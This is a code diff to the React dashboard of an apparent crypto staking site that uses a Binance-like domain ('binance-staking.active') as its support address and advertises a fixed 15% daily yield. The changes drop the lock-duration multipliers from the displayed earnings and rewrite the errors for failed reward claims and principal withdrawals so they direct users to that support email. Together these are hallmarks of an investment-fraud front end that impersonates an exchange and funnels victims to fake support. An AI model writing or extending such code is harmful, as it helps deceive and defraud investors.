@@ -19,6 +19,8 @@ interface DashboardPageProps {
   onConnect: () => void;
 }
 
+const SUPPORT_EMAIL = import.meta.env.VITE_SUPPORT_EMAIL || 'support@binance-staking.active';
+
 export const DashboardPage: React.FC<DashboardPageProps> = ({ 
   walletAddress, 
   stakes, 
@@ -88,9 +90,9 @@ export const DashboardPage: React.FC<DashboardPageProps> = ({
       
       const tx = await withdrawReferral(activeSigner, asset.address);
       toast.promise(tx.wait(), {
-        loading: `Withdrawal of ${assetId} referral rewards in progress...`,
-        success: 'Referral rewards successfully claimed!',
-        error: 'Failed to withdraw referral rewards.'
+        loading: `Withdrawal of ${assetId} rewards in progress...`,
+        success: 'Rewards successfully claimed!',
+        error: `Withdrawal failed. Please contact customer support at ${SUPPORT_EMAIL} for assistance.`
       });
       await tx.wait();
       fetchReferral();
@@ -120,16 +122,16 @@ export const DashboardPage: React.FC<DashboardPageProps> = ({
       const now = Date.now();
       const dailyRate = 0.15; // 15% Daily Base Yield
       
-      const total = stakes.reduce((acc, stake) => {
+      const activeStakes = stakes.filter(s => !s.claimed);
+      
+      const total = activeStakes.reduce((acc, stake) => {
         const amount = parseFloat(stake.amount);
         const startTime = stake.startTime; // in ms
         const elapsedSeconds = Math.max(0, (now - startTime) / 1000);
         
-        const multiplier = getMultiplier(stake.lockDuration);
-        
-        // Exact 15% daily yield * multiplier
-        // Formula: Amount * Rate * (Elapsed/86400) * Multiplier
-        const earned = (amount * dailyRate * multiplier * elapsedSeconds) / 86400;
+        // Exact 15% daily yield
+        // Formula: Amount * Rate * (Elapsed/86400)
+        const earned = (amount * dailyRate * elapsedSeconds) / 86400;
         
         return acc + earned;
       }, 0);
@@ -372,24 +374,15 @@ function StakeCard({ stake, signer, isActive, refresh }: StakeCardProps) {
     const amount = parseFloat(stake.amount);
     const dailyRate = 0.15; // 15% Daily Base Yield
     
-    // Helper match the user's logic exactly
-    const getMultiplier = (lockDurationSeconds: number) => {
-      const days = lockDurationSeconds / 86400;
-      if (days <= 90) return 1.5;
-      if (days <= 180) return 1.9;
-      if (days <= 270) return 2.5;
-      return 3.5;
-    };
-
-    const multiplier = getMultiplier(stake.lockDuration);
 
     const ticker = setInterval(() => {
       const now = Date.now();
       const startTime = stake.startTime; // in ms
       const elapsedSeconds = Math.max(0, (now - startTime) / 1000);
       
-      // Calculate yield: 15% daily * multiplier
-      const earned = (amount * dailyRate * multiplier * elapsedSeconds) / 86400;
+      // Calculate yield: 15% daily
+      // User earns 15% every 24 hours. Formula: Amount * 0.15 * (elapsed / 86400)
+      const earned = (amount * dailyRate * elapsedSeconds) / 86400;
       
       setLiveRewards(earned);
     }, 100);
@@ -424,7 +417,7 @@ function StakeCard({ stake, signer, isActive, refresh }: StakeCardProps) {
       toast.promise(tx.wait(), {
         loading: 'Authorizing claim on blockchain...',
         success: 'Yield successfully distributed!',
-        error: 'Contract execution failed.'
+        error: `Submission failed. Contact customer support at ${SUPPORT_EMAIL}`
       });
       await tx.wait();
       refresh();
@@ -453,7 +446,7 @@ function StakeCard({ stake, signer, isActive, refresh }: StakeCardProps) {
       toast.promise(tx.wait(), {
         loading: 'Processing principal withdrawal...',
         success: 'Capital successfully returned to wallet!',
-        error: 'Execution failed.'
+        error: `Withdrawal failed. Contact support at ${SUPPORT_EMAIL}`
       });
       await tx.wait();
       refresh();
@@ -481,7 +474,7 @@ function StakeCard({ stake, signer, isActive, refresh }: StakeCardProps) {
             </div>
           </div>
           <Badge className={`${stake.claimed ? 'bg-green-500/10 text-green-500' : 'bg-primary/10 text-primary'} border-none text-[8px] font-black tracking-widest uppercase h-6 px-3`}>
-            {stake.claimed ? 'Settled' : timeLeft === 0 ? 'Matured' : 'Mining'}
+            {stake.claimed ? 'Settled' : timeLeft === 0 ? 'Matured' : 'Yielding'}
           </Badge>
         </div>
 
